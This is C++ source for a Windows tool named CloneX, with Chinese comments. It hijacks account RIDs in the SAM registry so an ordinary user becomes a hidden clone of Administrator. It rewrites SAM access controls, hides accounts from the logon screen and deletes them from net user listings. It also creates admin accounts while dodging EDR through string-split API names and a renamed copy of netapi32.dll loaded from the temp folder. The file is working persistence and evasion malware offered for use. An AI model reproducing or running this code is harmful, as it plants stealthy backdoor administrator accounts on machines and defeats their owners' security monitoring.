// CloneX.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "CloneX.h"
#include "RegTool.h"
#include "AclTool.h"
#include "ElevateTool.h"
#include <iostream>
//因为太菜，所以用个全局变量
bool powermode = false;

bool is64BitOS()
{
	SYSTEM_INFO cur_system_info;
	GetNativeSystemInfo(&cur_system_info);
	WORD system_str = cur_system_info.wProcessorArchitecture;
	//判断是否为64位系统
	if (system_str == PROCESSOR_ARCHITECTURE_IA64 || system_str == PROCESSOR_ARCHITECTURE_AMD64)
	{
		return true;
	}
	return false;
}

void printUsage(wchar_t *filename) {

	
	std::cout << R"(
    __             ____    ___     ____  
   /  \   __ __   |__  |  |_  )   |__  | 
  | () |  \ \ /     / /    / /      / /  
   \__/   /_\_\    /_/    /___|    /_/		author:hl0rey

		)" << std::endl;
	wprintf(L"\n");
	wprintf(L"1. Clone zhangsan as administrator: %ws zhangsan\n",filename);
	wprintf(L"2. Clone zhangsan as lisi: %ws zhangsan lisi\n", filename);
	wprintf(L"3. Add zhangsan/123456 account(try to bypass edr): %ws zhangsan 123456\n", filename);
	wprintf(L"4. Add zhangsan/123456 account(try to bypass edr) and clone as wangwu: %ws zhangsan 123456 wangwu\n", filename);
	wprintf(L"[!]Powerful mode,trying to bypass,add * before the first parameter.\n");
	wprintf(L"\n");

}


bool cloneUser(wchar_t* username, wchar_t* cloneduser) {

	//获取RID
	wchar_t samPath[MAX_PATH] = L"SAM\\SAM\\Domains\\Account\\Users";
	wchar_t userSamPath[MAX_PATH];
	wchar_t cloneUserSamPath[MAX_PATH];
	//不在登录界面显示
	unsigned char UserDontShowInLogonUI[4] = { 0x01,0x00,0x00,0x00 };
	//不强制密码重置
	unsigned char ForcePasswordReset[4] = { 0x00,0x00,0x00,0x00 };
	wsprintf(userSamPath, L"%ws\\Names\\%ws", samPath, username);
	wsprintf(cloneUserSamPath, L"%ws\\Names\\%ws", samPath, cloneduser);
	RegTool* reg = new RegTool();
	DWORD userRid = NULL;
	DWORD clonedUserRid = NULL;
	reg->openReadkey(HKEY_LOCAL_MACHINE, userSamPath);
	DWORD errorcode = 0;
	//如果权限不够，修改访问权限
	if (reg->getErrorCode()==5)
	{
		AclTool* acl = new AclTool(SE_REGISTRY_KEY);
		acl->openDacl((wchar_t*)L"MACHINE\\SAM\\SAM");
		wprintf(L"[X]Access denied.\n");
		wprintf(L"[*]List current access contrl list.\n");
		acl->listAcl();
		reg->closeKey();
		acl->AddReadWriteACE((wchar_t *)L"MACHINE\\SAM\\SAM");
		errorcode=acl->getErrorcode();
		wprintf(L"[!]Add ACE,the errorcode is %d\n", errorcode);
		if (errorcode ==5)
		{
			//提升到system再尝试,待完成
			return false;

		}
		else if (errorcode==0)
		{
			wprintf(L"[!]ACE add successfully\n");
			reg->openReadkey(HKEY_LOCAL_MACHINE, userSamPath);
		}
		
		
	}
	reg->getType((wchar_t*)L"", &userRid);
	reg->closeKey();
	reg->openReadkey(HKEY_LOCAL_MACHINE, cloneUserSamPath);
	reg->getType((wchar_t*)L"", &clonedUserRid);
	reg->closeKey();
	wprintf(L"[*]Get target RID: %p %p\n",userRid,clonedUserRid);

	wchar_t fUserSamPath[MAX_PATH];
	wchar_t fCloneUserSamPath[MAX_PATH];
	wchar_t fcloneData[1024];
	DWORD fcloneDataSize = 1024;
	DWORD fcloneDataType = 3;
	char fUserData[1024];
	DWORD fUserDataSize = 1024;
	DWORD fUserDataType = 3;
	wchar_t vUserData[1024];
	DWORD vUserDataSize = 1024;
	DWORD vUserDataType = 3;

	//构造注册表路径
	wsprintf(fUserSamPath, L"%ws\\%p", samPath, userRid);
	wsprintf(fCloneUserSamPath, L"%ws\\%p", samPath, clonedUserRid);

	if (powermode)
	{
		//只需修改RID位置
		reg->openReadkey(HKEY_LOCAL_MACHINE,fUserSamPath);
		wprintf(L"[*]Open User F key for Read,errorcode is %d\n", reg->getErrorCode());
		reg->getValue((wchar_t*)L"F", (wchar_t *)fUserData, &fUserDataSize, &fUserDataType);
		wprintf(L"[*]Get user F Key data,errorcode is %d,datasize is %d,datatype is %d\n", reg->getErrorCode(), fUserDataSize, fUserDataType);
		reg->closeKey();
		//修改两个字节,与字节序有关
		unsigned char* ridarry = (unsigned char*)& clonedUserRid;
		//fUserData[0x30] = ridarry[0];
		//fUserData[0x31] = ridarry[1];
		//copymem吧,要操作单个字节所以要用char
		CopyMemory(&fUserData[0x30], &ridarry[0],1);
		CopyMemory(&fUserData[0x31], &ridarry[1], 1);
		wprintf(L"[*]Modify two bytes(RID).\n");
		reg->openWriteKey(HKEY_LOCAL_MACHINE, fUserSamPath);
		wprintf(L"[*]Open User F key for Write,errorcode is %d\n", reg->getErrorCode());
		reg->writeValue((wchar_t *)L"F", (wchar_t *)fUserData,fUserDataSize,fUserDataType);
		wprintf(L"[*]Write User F data,errorcode is %d\n", reg->getErrorCode());
		reg->closeKey();


	}else {
	
		//替换注册表内容
		//非必要
		reg->openReadkey(HKEY_LOCAL_MACHINE, fCloneUserSamPath);
		wprintf(L"[*]Open cloneduser F Key,errorcode is %d\n", reg->getErrorCode());
		reg->getValue((wchar_t*)L"F", fcloneData, &fcloneDataSize, &fcloneDataType);
		wprintf(L"[*]Get cloneduser F Key data,errorcode is %d,datasize is %d,datatype is %d\n", reg->getErrorCode(), fcloneDataSize, fcloneDataType);
		reg->closeKey();
		reg->openReadkey(HKEY_LOCAL_MACHINE, fUserSamPath);
		wprintf(L"[*]Open user F Key,errorcode is %d\n", reg->getErrorCode());
		reg->getValue((wchar_t*)L"F", (wchar_t *)fUserData, &fUserDataSize, &fUserDataType);
		wprintf(L"[*]Get user F Key data,errorcode is %d,datasize is %d,datatype is %d\n", reg->getErrorCode(), fUserDataSize, fUserDataType);
		reg->getValue((wchar_t*)L"V", vUserData, &vUserDataSize, &vUserDataType);
		wprintf(L"[*]Get user V Key data,errorcode is %d,datasize is %d,datatype is %d\n", reg->getErrorCode(), vUserDataSize, vUserDataType);
		//非必要
		//wchar_t sUserData[2048];
		//DWORD sUserDataSize = 2048;
		//DWORD sUserDataType = 3;
		//reg->getValue((wchar_t*)L"SupplementalCredentials", sUserData, &sUserDataSize, &sUserDataType);
		//wprintf(L"[*]Get user SupplementalCredentials Key data,errorcode is %d,datasize is %d,datatype is %d\n", reg->getErrorCode(), sUserDataSize, sUserDataType);
		reg->closeKey();
		//隐藏用户,但是不隐藏guest，可能没必要
		if (!((wcscmp(username, L"guest") == 0) || (wcscmp(username, L"Guest") == 0)))
		{
			//也可不删除，问题不大，删除可以保证账号相关数据比较干净,且保证无法通过net user删除
			wprintf(L"[*]Clear user %ws reg key data\n", username);
			NetUserDel(NULL, username);
		}

		//恢复用户
		//恢复Names项底下的
		reg->CreateReg(HKEY_LOCAL_MACHINE, userSamPath);
		reg->openWriteKey(HKEY_LOCAL_MACHINE, userSamPath);
		reg->writeValue(NULL, NULL, 0, userRid);
		reg->closeKey();
		//恢复RID命名的项
		reg->CreateReg(HKEY_LOCAL_MACHINE, fUserSamPath);
		//恢复RID命名项下的键值
		reg->openWriteKey(HKEY_LOCAL_MACHINE, fUserSamPath);
		wprintf(L"[*]Open User F key for write,errorcode is %d\n", reg->getErrorCode());
		reg->writeValue((wchar_t*)L"F", fcloneData, fcloneDataSize, fcloneDataType);
		wprintf(L"[*]Write User F data,errorcode is %d\n", reg->getErrorCode());
		reg->writeValue((wchar_t*)L"ForcePasswordReset", (wchar_t*)ForcePasswordReset, 4, REG_BINARY);
		wprintf(L"[*]Write User ForcePasswordReset data,errorcode is %d\n", reg->getErrorCode());
		//reg->writeValue((wchar_t *)L"SupplementalCredentials", sUserData,sUserDataSize,sUserDataType);
		//wprintf(L"[*]Write User SupplementalCredentials data,errorcode is %d\n", reg->getErrorCode());
		reg->writeValue((wchar_t*)L"UserDontShowInLogonUI", (wchar_t*)UserDontShowInLogonUI, 4, REG_BINARY);
		wprintf(L"[*]Write User UserDontShowInLogonUI data,errorcode is %d\n", reg->getErrorCode());
		reg->writeValue((wchar_t*)L"V", vUserData, vUserDataSize, vUserDataType);
		wprintf(L"[*]Write User V data,errorcode is %d\n", reg->getErrorCode());
		reg->closeKey();

	}

	return true;
}

//通过动态调用api，添加用户
int adduserloaddll(wchar_t* username, wchar_t* password,wchar_t* dllpath) {

	int result = 0;

	typedef DWORD(WINAPI * pNetUserAdd)(
		IN  LPCWSTR     servername OPTIONAL,
		IN  DWORD      level,
		IN  LPBYTE     buf,
		OUT LPDWORD    parm_err OPTIONAL
		);

	typedef DWORD(WINAPI * pNetLocalGroupAddMembers)(
		_In_opt_  LPCWSTR     servername OPTIONAL,
		_In_      LPCWSTR     groupname,
		_In_      DWORD      level,
		_In_reads_(_Inexpressible_("varies"))  LPBYTE     buf,
		_In_      DWORD      totalentries
		);

	//HMODULE hNetapi32 = LoadLibrary(L"Netapi32.dll");
	HMODULE hNetapi32 = LoadLibrary(dllpath);
	if (hNetapi32==INVALID_HANDLE_VALUE)
	{
		return -4;
	}
	char addapi[11] = "NetUs";
	char addapi2[11] = "erAdd";
	strcat(addapi, addapi2);
	pNetUserAdd pna = (pNetUserAdd)GetProcAddress(hNetapi32, addapi);

	char addgroup[24]="NetLocalGr";
	char addgroup2[24]= "oupAddMembers";
	strcat(addgroup, addgroup2);
	pNetLocalGroupAddMembers pnlg = (pNetLocalGroupAddMembers)GetProcAddress(hNetapi32, addgroup);

	// 定义USER_INFO_1结构体
	USER_INFO_1 ui;
	DWORD dwError = 0;
	ui.usri1_name = (LPWSTR)username;
	ui.usri1_password = (LPWSTR)password;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;
	if (pna(NULL, 1, (LPBYTE)& ui, &dwError) == NERR_Success)
	{

		result = result+1;

	}
	else
	{
		//添加失败    
		result = result - 1;

	}

	// 添加用户到administrators组
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = ui.usri1_name;
	if (pnlg(NULL, L"Administrators", 3, (LPBYTE)& account, 1) == NERR_Success)
	{
		//添加成功    
		result = result + 2;
	}
	else
	{
		//添加失败    
		result = result - 2;
	}

	CloseHandle(hNetapi32);
	return result;

}


int addUser(wchar_t* username, wchar_t* password) {

	int result = 0;
	
	//for test
	//result = -3;
	if (powermode) {
		//尝试绕过ring3 hook
		wprintf(L"[X]Add user faild,try to bypass.\n");
		wchar_t temppath[MAX_PATH];
		wchar_t sysdir[MAX_PATH];
		wchar_t windir[MAX_PATH];
		if (GetEnvironmentVariable(L"TMP", temppath, MAX_PATH)==0) {
			if (GetEnvironmentVariable(L"TEMP", temppath, MAX_PATH) == 0) {
				wprintf(L"[X]Can not locate temp path,use current dir.\n");
				GetModuleFileName(NULL,temppath,MAX_PATH);
				PathRemoveFileSpec(temppath);
			}
		}
		//要找到32位的dll在哪
		if (is64BitOS()) {
			wprintf(L"[*]Running on 64bit os,switch to SysWOW64 ,and find 32bit dll.\n");
			GetWindowsDirectory(windir,MAX_PATH);
			wsprintf(sysdir,L"%ws\\SysWOW64",windir);
		}
		else
		{
			GetSystemDirectory(sysdir, MAX_PATH);
		}
		wchar_t netapi[MAX_PATH];
		wchar_t desfile[MAX_PATH];
		wchar_t randfile[MAX_PATH];
		srand((unsigned)time(0));
		wsprintf(randfile,L"%d%d.dll",rand()%1000,rand() % 1000);
		wsprintf(netapi,L"%ws\\netapi32.dll", sysdir);
		wsprintf(desfile,L"%ws\\%ws", temppath, randfile);
		//只需要改一个字节
		if (CopyFile(netapi, desfile, FALSE)) {
			printf("[*]Dll Setup OK.\n");
		}
		wprintf(L"[*]Try again.\n");
		result = adduserloaddll(username, password, desfile);
		DeleteFile(desfile);
		if (result !=3)
		{
			if (result==-1)
			{
				wprintf(L"[!]Add successfully,but not in admin group.\n");
			}
			else{
				wprintf(L"[X]Add faild.\n");
			}
		}

	}
	else
	{	

		wchar_t a1[13]= L"Neta";
		wchar_t a2[13]= L"pi32.dll";
		wcscat(a1, a2);
		result = adduserloaddll(username, password, (wchar_t*)a1);
		return result;
	}
	
	
	return result;

}

int _tmain(int argc, wchar_t* argv[])
{
	int result = 0;
	
	if (argc>=2)
	{
		if (argv[1][0]==L'*') {
			argv[1] = &argv[1][1];
			powermode = true;
			wprintf(L"[*]Powerful mode,trying to bypass.\n");
		}
	}
	wprintf(L"\n");
	if (argc==1)
	{
		printUsage(argv[0]);
	}
	else if (argc == 2)
	{
		cloneUser(argv[1],(wchar_t *)L"Administrator");
	}
	else  if (argc == 3) {
		LPUSER_INFO_1 userinfo = NULL;
		DWORD errorcode=NetUserGetInfo(NULL,argv[2],1, (LPBYTE *)&userinfo);
		if(userinfo!=NULL) NetApiBufferFree(userinfo);
		if (errorcode== NERR_Success)
		{
			errorcode=NetUserGetInfo(NULL, argv[1], 1, (LPBYTE*)& userinfo);
			if (errorcode == NERR_Success)
			{
				cloneUser(argv[1], argv[2]);
			}
			else
			{
				wprintf(L"[X]%ws do not exist.\n", argv[1]);
			}
			

		}else {
			result=addUser(argv[1], argv[2]);
			if (result==3)
			{
				wprintf(L"[!]Add admin account Username: %ws Password: %ws \n", argv[1], argv[2]);
			}
		}
	}
	else if(argc==4)
	{
		result=addUser(argv[1], argv[2]);
		if (result==3)
		{	
			wprintf(L"[!]Add admin account Username: %ws Password: %ws \n", argv[1], argv[2]);
			cloneUser(argv[1], argv[3]);
		}
		else if (result == -1)
		{
			wprintf(L"[!]Add account Username: %ws Password: %ws \n", argv[1], argv[2]);
			wprintf(L"[*]No admin account clone.\n");
			cloneUser(argv[1], argv[3]);
		}
		else
		{
			wprintf(L"[X]Add fail,can not clone.\n");
		}
	}
	return 0;
}



